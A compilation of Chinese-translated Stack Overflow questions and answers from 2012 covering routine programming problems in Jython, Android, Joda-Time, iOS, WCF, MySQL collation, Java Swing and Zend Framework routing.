我如何迭代 Jython PyList 并将我包含的对象转换或转换为 java.lang.String ？

在[这个](http://wiki.python.org/jython/JythonMonthly/Articles/September2006/1)旧教程中，它是通过使用 __ tojava __ 来完成的：

```
(EmployeeType)employeeObj.__tojava__(EmployeeType.class); 
```

我想这可能是这样的：

```
 PyList pywords = pythonFactoryCreatedObject.pythonMethodReturningPyList()

 int count = pywords.__len__();
 for (int idx = 0 ; idx < count ; idx++) {
     PyObject obj = pywords.__getitem__(idx);

    //here i do not know how to have a kind of 'String word = pywords[idx]' statement

    //System.out.println(word);
 } 
```

是否也有可能：

*   从 PyList 到 java Array 或 List 的转换？以便可以使用构造'for（String word：mylist）{}'？

*   将简单的 python 字典映射到适当的 java 对象时，我也会遇到同样的问题，最好的映射是什么？

是否有关于 Jython 的 java 部分用法的教程文档？我对 python 很满意，但对 Java 和 Jython 来说是新手，我只找到了 Jython 的 Java 使用文档，而我需要在 Java 框架中嵌入一个 Python 模块......

最好的

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-07T07:59:27.183

`PyList`实际实现`java.util.List<Object>`，因此您可以直接从 Java 端使用它。如果你用字符串填充，它的元素将是`PyString`（或者可能是`PyUnicode`）。所以：

```
List pywords = pythonFactoryCreatedObject.pythonMethodReturningPyList();
for (Object o : pyList){
  String string = ((PyString) o).getString();
  //whatever you want to do with it 
} 
```

或者

```
List pywords = pythonFactoryCreatedObject.pythonMethodReturningPyList()
for (Object o : pyList){
  String string = ((PyObject) o).__toJava__(String.class);
  //whatever you want to do with it 
} 
```

哪个你觉得更清楚。

编辑： [这是将 Jython 嵌入 Java 的标准文档](http://www.jython.org/jythonbook/en/1.0/JythonAndJavaIntegration.html#using-jython-within-java-applications)。从 Java 中使用 Jython 的更好方法是从 Jython 实现 Java 接口并从 Java 中操作接口，但您似乎正在使用现有的 Python 代码库，因此如果不进行一些更改，它将无法工作。

# android - 如何在 Android 2.3 上查看摄像头 ip 与 webview 的使用情况？

> ID：10446775
> 
> 赞同：0
> 
> 时间：2012-05-04T10:08:42.397
> 
> 标签：android

我的相机是 7Links，这是我的编解码器：

```
 String url="http://192.168.0.8/main.htm";
    webview.setHttpAuthUsernamePassword("192.168.0.8", "", "admin", "");
    webview.getSettings().setJavaScriptEnabled(true);
    webview.getSettings().setPluginsEnabled(true);
    webview.loadUrl(url); 
```

当我运行代码时webview出现黑色，故障在哪里？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T10:31:05.200

可能是使用插件/activex/windows 或某种在 android 中不起作用的特定于桌面的插件？它在桌面浏览器中是什么样子的，当您在桌面上的相机窗口中单击鼠标右键时会得到什么？html 是什么样的？

# java - Joda DateTime 转换语言环境

> ID：10446776
> 
> 赞同：0
> 
> 时间：2012-05-04T10:08:42.943
> 
> 标签：java, jodatime

我试图在 Joda DateTime 中转换毫秒。Millis 是**1338501600000** 我使用了在线转换器和其他库，所有结果都是**1338501600000** millis 是**Fri Jun 01 2012 00:00:00 GMT+0200 (CEST)**

在 Joda 中，结果是：**2012-05-31T22:00:00.000Z**

为什么？

* * *

解决：

```
long millis = 1338501600000;
TimeZone tz = TimeZone.getTimeZone("GMT+2:00");
DateTimeZone dtz = DateTimeZone.getDefault();
dtz.setDefault(DateTimeZone.forTimeZone(tz));
DateTime rightDate = new DateTime(millis,dtz); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T10:17:41.440

这些是相同的日期。如果您从 GMT+0200 日期减去 2 小时，您将获得 Joda 结果，该结果采用 GMT 时区。

单个日期（即时）可以用不同的方式表示为字符串，并且表示取决于用于生成此表示的时区。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T10:18:51.383

注意 Fri Jun 01 2012 00:00:00 GMT+0200 和 2012-05-31T22:00:00.000Z 是同一时刻，只有第一个显示在 GMT+0200 时区，第二个显示在UTC（这是 Z 表示的）。

# iphone - iOS 视图“折叠”动画

> ID：10446777
> 
> 赞同：6
> 
> 时间：2012-05-04T10:08:48.247
> 
> 标签：iphone, objective-c, ios, ipad

我已经看到[了这种很好的效果](http://vimeo.com/41495357)，我想在我目前正在设计的应用程序中使用类似的东西。我假设这不是“标准”转换之一。

有谁知道如何实现这样的目标？我并不真正追求详细的代码示例，更多的是高级概述/朝着正确的方向轻推。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-04T10:37:26.857

我会这样做：

1.  创建两层：一层用于左侧，另一层用于要折叠的视图的右侧。

2.  在这些层中，分别渲染要折叠的视图左侧或右侧的图像。在大多数情况下，该`renderInContext:`方法应该这样做。

3.  两层的初始位置在屏幕的左边缘（x = 0.0）。将左侧图层的锚点设置为 (0.0, 0.5)，将右侧图层的锚点设置为 (1.0, 0.5)。您还应该为图层分配围绕 y 轴的旋转变换：左侧图层为 -90 度，右侧图层为 +90 度（或者相反，我不确定；试试看）。

4.  现在，当用户激活折叠动作时，启动一个动画（或伴随一个手势），将两层的变换重置为单位矩阵。您可能还必须调整右侧图层的位置，使其不会紧贴屏幕的左边缘。

5.  仅当动画/手势完成时，您才将两个图层（仅包含静态图像）替换为您想要折叠的实际视图。

# mysql - 使用 Mysql 驱动的下拉菜单显示 Google 地图标记

> ID：10446779
> 
> 赞同：1
> 
> 时间：2012-05-04T10:09:00.633
> 
> 标签：mysql, ajax, google-maps, drop-down-menu

我必须在 MySQL 数据库的下拉列表中填充值，在选择值时我必须生成带有地图上相关标记位置的谷歌地图。现在我的数据库结构和值如下

[带值的数据库](http://www.freeimagehosting.net/qlmgp)

我有一个三重下拉逻辑，在我选择最后一个下拉菜单并单击提交后，我得到了 o/p，因为**您选择了黑色雪佛兰 Camaro**，因为您可以看到选择的值是基于显示的选择的值我已经编写了一个选择查询，我需要使用 ajax 显示带有标记的谷歌地图来代替该文本。

三重下拉的逻辑在这里是[三重下拉逻辑](http://pastebin.com/9Mn8pT9Z)

# vb.net - 低质量图像成标签

> ID：10446781
> 
> 赞同：0
> 
> 时间：2012-05-04T10:09:03.567
> 
> 标签：vb.net, image, bitmap, label

我正在尝试向用户传递一个显示倒计时的图像。为此，我使用了一个单独的线程来检查何时应该启动倒数计时器，如果是这样，我每 6 秒绘制一次图像。

令人讨厌的是，当我将绘制的图像传递给 UI 时，图像的质量发生了变化，并且对用户来说看起来很糟糕。

这是我处理图纸的小脚本：

```
Try
   remainingTime = (#12:04:00 AM# - (DateTime.Now - local_DateTimeclick)).ToString("HH:mm:ss")
   remainingTimeInSeconds = Convert.ToDateTime(remainingTime).Minute * 60 + Convert.ToDateTime(remainingTime).Second

   If remainingTimeInSeconds Mod 6 = 0 Then
      g.ResetTransform()
      g.TranslateTransform(52, 52)
      g.RotateTransform(230 - remainingTimeInSeconds / 6 * 9)

      'g.CompositingQuality = Drawing2D.CompositingQuality.HighQuality
      'g.SmoothingMode = Drawing2D.SmoothingMode.AntiAlias
      'g.InterpolationMode = Drawing2D.InterpolationMode.HighQualityBicubic
      'g.CompositingMode = Drawing2D.CompositingMode.SourceCopy
      'g.PixelOffsetMode = Drawing2D.PixelOffsetMode.

      g.DrawImage(Tick, 10, 10)
   End If

Catch
   remainingTime = "Times Up"
End Try 
```

在上面的部分中， - *local_DateTimeClick* 是倒计时开始时设置的变量 - *Tick*是一个位图，表示我必须每 6 秒绘制的图像 - *g*是我返回到的图像中的图形对象主窗口。

还尝试更改*g*的属性，但没有积极效果。

任何人都知道我该怎么做才能使其正常工作而不改变返回图像的质量？欢迎任何提示/建议。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-09T18:13:56.607

因为`Drawing2D.SmoothingMode`只适用于 和 等二维矢量图绘制`Graphics.DrawEllipse`方法`Graphics.DrawLine`。

它不影响使用`Graphics.DrawImage`.

从[.NET 文档](http://msdn.microsoft.com/en-us/library/system.drawing.graphics.smoothingmode.aspx)：

> 平滑模式指定线条、曲线和填充区域的边缘是否使用平滑（也称为抗锯齿）。

此时您有两个选择：

1.  预渲染图像的每个可能方向，然后`Image`在每个刻度处显示不同的对象
2.  使用[.NET 矢量绘图方法](http://msdn.microsoft.com/en-us/library/system.drawing.drawing2d.aspx)来渲染图像，而不是使用预渲染位图。

在不知道您正在转换的实际图像的情况下，我不能说哪个更合适。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T12:48:19.477

从我公司的平面设计师的角度来看，我认为您应该裁剪图像以适合标签：
1.它通过节省处理能力来提高性能。
2\. 更好看？！
问候

# c# - WCF 返回 System.IO.Stream 乱码

> ID：10446783
> 
> 赞同：0
> 
> 时间：2012-05-04T10:09:07.120
> 
> 标签：c#, wcf, stream, iis-6

我在我的软件项目中使用 WCF 接口包装现有的 ASMX Web 服务作为过渡阶段，以节省时间。除了一个返回 System.String 的函数外，这很好用。

原始 ASMX 服务根据给定的参数返回文本或 XML。这在 ASMX 中不是问题。在 WCF 中，返回的值（如果是 XML）被转义为：`&lt;gml&gt;`应该在哪里`<gml>`。请参阅下面的 SOAP。

**要求**

```
POST http://someuri.org/WebServices/Utils.svc HTTP/1.1
Content-Type: text/xml; charset=utf-8
SOAPAction: http://www.someuri.org/IUtils/Function
Content-Length: 283
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
Host: foo.bar.org
Connection: Keep-Alive

<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
    <s:Body>
        <Function xmlns="http://www.someri.org/">
            <type>...</type>
            <input1>...</input1>
            <input2>...</input2>
            <input3>true</input3>
        </Function >
    </s:Body>
</s:Envelope> 
```

**回复**

```
HTTP/1.1 200 OK
Date: Fri, 04 May 2012 11:40:01 GMT
Server: Microsoft-IIS/6.0
X-Powered-By: ASP.NET
X-AspNet-Version: 2.0.50727
Cache-Control: private
Content-Type: text/xml; charset=utf-8
Content-Length: 2070

<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
    <s:Body>
        <FunctionResponse xmlns="http://www.crotec.nl/">   
            <FunctionResult>&lt;gml&gt;data&lt;/gml&gt;</FunctionResult>
        </FunctionResponse>
    </s:Body>
</s:Envelope> 
```

一些谷歌搜索让我返回一个 System.IO.Stream 对象。

```
string result = DoStuff(arg1, arg2, arg3);            
byte[] bin = Encoding.UTF8.GetBytes(result);
WebOperationContext.Current.OutgoingResponse.ContentType = "text/plain";
return new System.IO.MemoryStream(bin); 
```

这在一定程度上有效。

```
string result =  "02010415DBD800D7E17577787A626978";
byte[] bin = {48,50,48,49,48,52,49,53,68,66,68,56,48,48,68,55,69,49,55,53,55,55,55,56,55,65,54,50,54,57,55,56}; 
```

然而，SOAP 消息中的返回结果是：

```
MDIwMTA0MTVEQkQ4MDBEN0UxNzU3Nzc4N0E2MjY5Nzg= 
```

所以结果输出是乱码（我认为，再次，由消息编码（？）引起）

该方法是带有 OperationContract 的 attr，并且该服务托管在 IIS6 中，具有以下 ABC：

```
<service name="WebServices.BeheerUtils" behaviorConfiguration="Services.ServiceBehavior">
    <!-- Service Endpoints -->
    <endpoint address="" binding="basicHttpBinding" contract="WebServices.IUtils"/>
    <endpoint address="mex" binding="mexHttpBinding" contract="IMetadataExchange"/>
</service> 
```

任何想法为什么输出是乱码或如何防止 HTML 编码？

**界面**

```
[OperationContract]
System.IO.Stream Function(string type, string input1, string input2, string input3); 
```

**执行**

```
public new System.IO.Stream Function(string type, string input1, string input2, string input3)
{
    // Call the old ASMX method
    string result = DoStuff(type, input1, input2, input3, true);

    byte[] bin = Encoding.UTF8.GetBytes(result);
    WebOperationContext.Current.OutgoingResponse.ContentType = "text/plain";
    return new System.IO.MemoryStream(bin);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T11:37:55.700

我不能同意这种说法：

> 这在 ASMX 中不是问题。在 WCF 中，返回的值（如果是 XML）被转义为：`&lt;gml&gt;`应该在哪里`<gml>`。

我用方法创建了一个服务：

```
[OperationContract]
string GetXml(string str);

public string GetXml(string str)
{
    return "<gml>" + str + "</gml>";
} 
```

然后我使用生成的 WCF 客户端调用服务：

```
var client = new MyWcfServiceClient();
var result = client.GetXml("test"); 
```

结果是：

```
<gml>test</gml> 
```

**更新**

只是为了确保您这是 xml 的标准行为方式，请执行以下测试并检查 的值`respone.FunctionResult`：

```
public class FunctionResponse
{
    public string FunctionResult { get; set; }
}

public void Test()
{
    var serialized = @"<?xml version=""1.0"" encoding=""UTF-8""?>
<FunctionResponse>   
    <FunctionResult>&lt;gml&gt;data&lt;/gml&gt;</FunctionResult>
</FunctionResponse>";
    var ser = new XmlSerializer(typeof(FunctionResponse));
    using (var stringReader = new StringReader(serialized))
    {
        using (var xmlReader = new XmlTextReader(stringReader))
        {
            var response = ser.Deserialize(xmlReader);                    
        }
    }            
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T12:01:37.240

如果你的函数返回一个字符串，那么它应该被编码是正常的。

您可以尝试声明您的函数返回一个`XmlNode`而不是一个字符串。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-04T10:57:55.420

使用 basicHttpBinding 而不是 wsHttpBinding。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-07T07:05:37.393

所以我摆弄了一些返回类型，这就是我能做的：

```
string result = DoStuff(type, input1, input2, input3, true);

XDocument d = new XDocument();
XDocument basis = new XDocument(new XElement("result"));

// Load the result into a XDocument, add the result as a value of the wrapper element if the format is invalid    
try
{
    d = XDocument.Parse(result);
    basis.Root.Add(d.Root);
}
catch (Exception)
{
    basis.Root.Value = result;
}    

// Return the XElement
return basis.Root; 
```

我基本上将所有响应包装在一个新的 Root 元素中。这给了我封装的 SOAP 中的文字 XML，而不是“html 编码”。尽管它可以满足我的需求，但我觉得很尴尬。但是我发现没有其他解决方案适合我的需要，因此我将其作为最终解决方案提出。

# garbage-collection - 垃圾收集器调用 clear() (CF 3.5) 时泛型收集出现 NotSupportedException

> ID：10446786
> 
> 赞同：0
> 
> 时间：2012-05-04T10:09:43.740
> 
> 标签：garbage-collection, compact-framework, dispose, .net-cf-3.5, notsupportedexception

第一件事：这是一个紧凑的框架 3.5 应用程序。

我有一个非常奇怪的问题。在 Dispose-Method 中，应用程序在集合中处理项目，然后清除列表。到目前为止，没有什么特别的，当我的应用程序调用 Dispose 时，它​​就像一个魅力。但是一旦垃圾收集器调用终结器，它调用相同的 Dispose-Method，系统就会在通用集合的 Clear-Method 上抛出 NotSupported-Exception。

这是 Dispose-Method 的主体：

```
public override void Dispose()
{
    if (items != null)
    {
        foreach (Shape item in items)
        {
            item.Dispose();
        }
        items.Clear();
        items = null;
    }
    base.Dispose();
} 
```

我完全被困在这里。也许有人可以向我解释一下，或者有类似的问题并解决了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-20T19:38:49.500

如果有非托管资源需要清理，终结器只需要调用 Dispose。从终结器调用时，您不能尝试访问托管资源。

正如上面评论中提到的，没有理由 [我们可以看到] 你的类应该实现终结器。

作为参考，如果您需要使用终结器，请使用 Dispose 模式，如下所示：

```
// The finalizer
~MyClass()
{
    Dispose(false);
}

// The IDisposable implemenation
public void Dispose()
{
    Dispose(true);
    GC.SuppressFinalize(this);
}

// The "real" dispose method
protected virtual void Dispose(bool disposing)
{
    if (!_disposed)
    {
        if (disposing)
        {
            // Dispose managed objects here
        }
        else
        {
            // Free unmanaged resources here
        }
        _disposed = true;
    }
} 
```

# php - 如何在 MySQL 中控制 UTF-8 排序？

> ID：10446787
> 
> 赞同：6
> 
> 时间：2012-05-04T10:09:49.883
> 
> 标签：php, mysql, sorting, utf-8, collation

例如，这是标准“按名称排序”查询返回的顺序：

```
name
------
Cebbb
Čebbc
Cebbd 
```

我想按名称排序并*首先*获取重音字符，与其他重音字符分组，例如

```
name
------
Čebbc
Cebbb
Cebbd 
```

默认情况下，MySql 将`Č`其视为`C`，出于排序目的，并按显示的顺序进行排序。

或者，有没有一种方法可以在 PHP 中“转换”`Č`为`C`用于比较目的？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-04T10:31:03.717

您可以在[子句中](http://dev.mysql.com/doc/refman/5.0/en/charset-collate.html)[添加`COLLATE`表达式`ORDER BY`](http://dev.mysql.com/doc/refman/5.0/en/charset-collate.html)：

```
SELECT k
FROM t1
ORDER BY k COLLATE utf8_spanish_ci; 
```

然后，将使用正确的排序规则对列进行排序，并且列定义可以保持不变。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-04T10:16:13.080

最简单的方法是对列本身应用适当的排序规则，例如：

```
CREATE TABLE foo (
    foo_id INT(10) UNSIGNED NOT NULL AUTO_INCREMENT,
    `name` VARCHAR(30) NOT NULL COLLATE 'utf8_spanish_ci',
    PRIMARY KEY (`foo_id`)
)
COLLATE='utf8_spanish_ci'
ENGINE=InnoDB; 
```

* * *

**更新：**

[Č](http://en.wikipedia.org/wiki/%C4%8C#Uses)不是西班牙字母：

> 在克罗地亚语、斯洛文尼亚语、波斯尼亚语、Skolt Sami 和 Lakota 字母表中，它是字母表的**第四个**字母。在捷克语、北萨米语字母表以及波罗的海语言立陶宛语和拉脱维亚语中，该字母排在 **第五位**。在斯洛伐克语中，它是字母表的**第六个**字母。它也用于普什图语（相当于 چ‎）和萨尼奇语。

与数字不同，字母没有固定的绝对顺序。字母顺序的整个概念是相对的——你必须首先选择一个规则集。运行此 SQL 查询以了解您的 MySQL 服务器中有哪些可用：

```
SHOW CHARACTER SET 
```

...并选择更符合您期望的那个。手册中有[简要说明](http://dev.mysql.com/doc/refman/5.5/en/charset-charsets.html)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-04T11:14:58.750

要将带有重音符号或变音符号的特殊字符替换为普通拉丁字符，您可以使用 php 函数[`iconv`](http://php.net/manual/de/function.iconv.php)：

```
iconv("UTF-8", "ASCII//TRANSLIT", $text) 
```

这会将变量`$text`转换为纯 ASCII 字符。例如，*müßig*会被转换成muessig *，*而*caffée会被转换成**caffee*。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-04T12:08:57.623

好的，这是*我*对不可否认的特殊情况的解决方案：

```
ORDER BY SUBSTRING(name, 1, 1),
         BINARY SUBSTRING(name, 1, 1),
         name 
```

这当然不是最有效的查询——不过，在这种情况下，这并不是什么大问题——但它*确实*通过以下方式解决了我的问题：

1.  按初始字符排序（MySql 会将其`Č`视为`C`相同）
2.  *然后*按初始字符的二进制值排序，这将区分`Č`和`C`
3.  *然后*按全名排序，这实际上将按字符串的其余部分排序。

这将在第一个字符之后进行非最佳排序，但这不是问题。

# java - 为什么java中的包命名开头有TLD

> ID：10446788
> 
> 赞同：1
> 
> 时间：2012-05-04T10:09:53.473
> 
> 标签：java

为什么 java 建议在包名称的开头使用 TLD，即为什么必须是

```
package com.example.pack; 
```

它也可以

```
package pack.example.com; 
```

只是想知道决定将 TLD 放在开头的原因可能是什么。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-04T10:12:51.563

这个约定被记录[在这里](http://www.oracle.com/technetwork/java/codeconventions-135099.html)，它被证明并且适用于很多事情。

宇宙是`com`并且可以是`SG`，`ORG`或任何TLD :)。

其次是您的域`example`。

其次是你的项目`pack`。

其次是你的层`web | ejb | data`。

```
com.example.pack.web
com.example.pack.ejb
com.example.pack.data
com.example.project2.web
com.example.project2.ejb
com.example.project2.data
com.singtel.projecta.web
com.singtel.projectb.data 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-04T10:14:38.173

该包对应于文件系统中的目录。pack.example.com 和 pack.example2.net 都在同一个目录中，即使 url 表明它们不相关，但是对于 com.example.pack 和 net.example2.pack，相关的包在同一个目录中.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-04T10:20:57.557

主要动机是通过分层组织类和资源（如文件系统）来避免命名空间冲突。将文本文件引用为`MyDoc.txt\My Documents\C:`. 使用您的 TLD 名称，颠倒过来，可以更自然地组织事情，从更一般到更具体。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-04T10:14:48.297

从更一般到更具体，这只是一种常见的约定，反之亦然。

同样，我们写道：

*   `package_name`. `class_name`（而不是`class_name`. `package_name`）；
*   `object`. `member`;
*   `outer_class`. `inner_class`;

等等。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-04T10:15:08.780

Java 包名称应始终从最不具体到最具体读取。因此，它应该始终以域名开头。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-05-04T10:15:09.957

一个很好的理由是类名是**前缀**而不是包名**后缀**——所以你在每个点之后都朝着同一个方向移动。此外，包名称映射到目录名称，这也强制使用最广泛的优先顺序。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-05-04T10:15:14.093

在树中，树干是主要部分，叶子是不太常见的部分。

包名是一棵树。

考虑在类路径中的所有类中搜索您编写的类。你会开始 com.* com.example.* 等等，直到你找到你的。

# android - 一旦我在 Android 微调器上选择了一个项目，就不会设置任何文本。

> ID：10446790
> 
> 赞同：1
> 
> 时间：2012-05-04T10:10:01.247
> 
> 标签：android

当我从微调器中选择任何项目时，没有设置任何文本。可能是什么错误？

```
 ArrayAdapter<String> pSelectAdapter =  new ArrayAdapter<String>(PCreate.this,android.R.layout.simple_spinner_item, pNames);
    pSelectAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
    selectP.setAdapter(pSelectAdapter);

    selectP.setOnItemSelectedListener(new OnItemSelectedListener() {

        @Override
        public void onItemSelected(AdapterView<?> arg0, View arg1,
            int arg2, long arg3) {
        // TODO Auto-generated method stub
        String nameSelected = pNames.get(arg2);
        pID = pMatch.get(nameSelected);
        p.setText(nameSelected);

        }

        @Override
        public void onNothingSelected(AdapterView<?> arg0) {
        // TODO Auto-generated method stub

        }

    }); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T10:46:10.723

我认为您在这里错过了创建 View 类的对象，请将此行与您的代码匹配，并进行此更改，这可能会对您有所帮助..

```
selectP.setOnItemSelectedListener(new View.OnItemSelectedListener() {

(new View.OnItemSelectedListener() instaed (new OnItemSelectedListener() 
```

# ios - UItableviewcell“单元标识符”内存管理

> ID：10446793
> 
> 赞同：1
> 
> 时间：2012-05-04T10:10:01.817
> 
> 标签：ios, iphone, uitableview

如果我们给所有单元格赋予相同的标识符，则消失单元格使用出现单元格的内存。意味着当我滚动表格视图时内容将重复。但是如果我们给出 diff 标识符，那么每个单元格都会有自己的内存位置并完美地显示数据。

现在假设我在表格视图中加载了 1000 条或更多记录。如果我给出不同的标识符，内存中会有很多分配。那么有没有什么解决方案可以以最少的内存分配完美地显示数据？

这是我定义单元格标识符的方式：

```
-(UITableViewCell *)tableView:(UITableView *)tableView 
        cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    NSString *cellIdentifier = [NSString stringWithFormat:@"%d%d",indexPath.section,indexPath.row];
    UITableViewCell *Cell = [tableView dequeueReusableCellWithIdentifier:cellIdentifier];

    if (Cell == nil) 
    {
        Cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleSubtitle 
                                      reuseIdentifier:cellIdentifier];
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T10:17:45.293

您遇到的问题是由于您不正确地使用单元标识符引起的。对于要重用的所有单元格，单元格标识符应该相同。看看这个模板，它应该解释正确的方法：

```
-(UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
    NSString *cellIdentifier = @"MY_CELL";
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:cellIdentifier];
    if (cell == nil) {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleSubtitle reuseIdentifier:cellIdentifier];
        // everything that is similar in all cells should be defined here
        // like background colors, label colors, indentation etc.
    }
    // everything that is row specific should go here
    // like label text, progress view progress etc.
    return cell;
} 
```

顺便提一句。使用驼峰式命名您的变量，大写名称用于类名。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T11:00:04.303

您应该清除出列单元格的内容，例如清空标签等。如果您为每个单元分配单独的内存，您将很容易内存不足。完美的内存管理仍然是重用单元格。

# java - java paint方法没有被调用

> ID：10446794
> 
> 赞同：0
> 
> 时间：2012-05-04T10:10:01.890
> 
> 标签：java, swing, graphics, repaint, paintcomponent

我用java制作了一个游戏，我似乎无法`paintComponent()`在我的游戏中调用该方法。这是代码：

```
public class TwinMoonTowers extends JPanel implements ActionListener{

    private class TMTMenu extends MouseAdapter{
        private Icon start, shop, quit;
        private Icon main_bg;

        public TMTMenu (){
            System.out.println("starting menu...");

            start = new Icon(TMTConstant.START_SOURCE,
                        TMTConstant.START_COORD_X, TMTConstant.START_COORD_Y);

            shop = new Icon (TMTConstant.SHOP_SOURCE,
                        TMTConstant.SHOP_COORD_X, TMTConstant.SHOP_COORD_Y);

            quit = new Icon (TMTConstant.EXIT_SOURCE,
                        TMTConstant.EXIT_COORD_X, TMTConstant.EXIT_COORD_Y);

            main_bg = new Icon (TMTConstant.MAIN_MENU_BG, 0, 0);
        }

        @Override
        public void mousePressed(MouseEvent me){

            int x = me.getX();
            int y = me.getY();

            System.out.println("coord: "+x+","+y);

            if (me.getButton() == MouseEvent.BUTTON1){
                if (x > start.x && x < start.x + start.getIcon().getWidth(null)
                        && y > start.y && y < start.y + start.getIcon().getHeight(null)){
                    curState = TMTConstant.MODE_STATE;
                }
                else if (x > quit.x && x < quit.x + quit.getIcon().getWidth(null)
                        && y > quit.y && y < quit.y + quit.getIcon().getHeight(null)){
                    curState = TMTConstant.EXIT_STATE;
                }
                else if (x > shop.x && x < shop.x + shop.getIcon().getWidth(null)
                        && y > shop.y && y < shop.y + shop.getIcon().getHeight(null)){
                    curState = TMTConstant.SHOP_STATE;
                }
            }

        }
    }

    private class TMTModeSelector extends MouseAdapter{
        private Icon TwinTower, TripleTower, back;

        public TMTModeSelector(){

        }

        @Override
        public void mousePressed(MouseEvent e){

        }
    }

    private String testDebug;
    private int curState;
    private TMTMenu menu;

    public TwinMoonTowers (){
        menu = new TMTMenu();
        curState = TMTConstant.MAIN_MENU_STATE;

        System.out.println("creating panel..");

        this.setVisible(true);
        this.setDoubleBuffered(true);
        this.setSize(TMTConstant.WINDOW_WIDTH, TMTConstant.WINDOW_HEIGHT);
        this.addMouseListener(menu);
    }

    @Override
    public void actionPerformed(ActionEvent arg0) {
        // TODO Auto-generated method stub
        this.repaint();

    }
    @Override
    public void paintComponent (Graphics g){
        super.paintComponent(g);
        Graphics2D g2d = (Graphics2D) g;

        System.out.println("preparing canvas..");

        switch(curState){
            case TMTConstant.MAIN_MENU_STATE :
                g2d.drawImage(menu.main_bg.getIcon(), menu.main_bg.x, menu.main_bg.y, this);
                g2d.drawImage(menu.start.getIcon(), menu.start.x, menu.start.y, null);
                g2d.drawImage(menu.quit.getIcon(), menu.quit.x, menu.quit.y, null);
                g2d.drawImage(menu.shop.getIcon(), menu.shop.x, menu.shop.y, null);
                break;
            case TMTConstant.GAME_STATE :
                break;
            case TMTConstant.SHOP_STATE :
                break;
            case TMTConstant.MODE_STATE :
                break;
        }

        System.out.print("render image...");

        Toolkit.getDefaultToolkit().sync();
        g.dispose();

    }
} 
```

而类图标是这样的：

```
public class Icon{

private Image pic;
public int x, y;

public Icon (String path, int x, int y){

    ImageIcon ii = new ImageIcon (path);
    pic = ii.getImage();

    this.x = x;
    this.y = y;
}

public Image getIcon() {return pic;}
} 
```

这里的基础是绘制一个包含 3 个按钮（开始、购物、退出）的菜单

但是，paintComponent 方法没有被调用（system.out.println 没有显示）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T11:00:29.360

```
Toolkit.getDefaultToolkit().sync();
g.dispose(); 
```

这些行是不必要的（甚至可能是错误的），删除它们。

问题很可能不在您发布的代码中。您在哪里将面板添加到顶级窗口（框架/小程序）？您对其内容窗格使用什么布局？我的猜测是大小是 (0,0) 所以面板不会被绘制。

# php - Zend Framework - 添加 Zend_Rest_Route 时覆盖的自定义路由

> ID：10446795
> 
> 赞同：0
> 
> 时间：2012-05-04T10:10:02.963
> 
> 标签：php, zend-framework, rest, zend-rest-route

我正在创建一个应用程序，该应用程序在名为`api`. 对于其他模块，我创建了一个小类，它返回一个`Zend_Controller_Router_Rewrite`带有自定义路由的对象：

```
$router = new Zend_Controller_Router_Rewrite();
foreach ($this->_modules as $module) {
    if ($module === 'api') continue;
    foreach ($this->_getConfigFiles($module) as $filename) {
        $config = new Zend_Config_Ini($filename, 'routes');
        $router->addConfig($config, 'routes');
    }
}
return $router; 
```

对于默认模块，我有以下路线：

```
[routes]
routes.default_index_index.type = Zend_Controller_Router_Route
routes.default_index_index.route = /
routes.default_index_index.defaults.module = default
routes.default_index_index.defaults.controller = index
routes.default_index_index.defaults.action = index 
```

现在，在我的`Bootstrap`文件文件中，我有以下内容：

```
$router = Shark_Module_Loader::getInstance()->getRouter();
$frontController->setRouter($router);
$frontController->getRouter()->removeDefaultRoutes();
$apiRoute = new Zend_Rest_Route($frontController, array(), array('api'));
$router->addRoute('rest', $apiRoute); 
```

当然，如果我跳过添加其余路线，默认模块的一切正常。但是当我添加 RESTful 路由时，路由器中定义的路由被覆盖（？），因此模块控制器（）的`index`操作中的当前路由是 Zend_Rest_Route 的一个实例。因此，当尝试访问在路由配置文件中定义的自定义路由时，可以说：`index``default``$this->getFrontController()->getRouter()->getCurrentRoute();`

```
...
routes.default_pages_view.type = Zend_Controller_Router_Route
routes.default_pages_view.route = /view/:page
routes.default_pages_view.defaults.module = default
routes.default_pages_view.defaults.controller = pages
routes.default_pages_view.defaults.action = view
... 
```

我收到 404 错误，指出请求操作 ( `get`) 不存在。

我已经浏览了文档，没有看到任何暗示这种行为的提示。

任何帮助和指导将不胜感激。

* * *

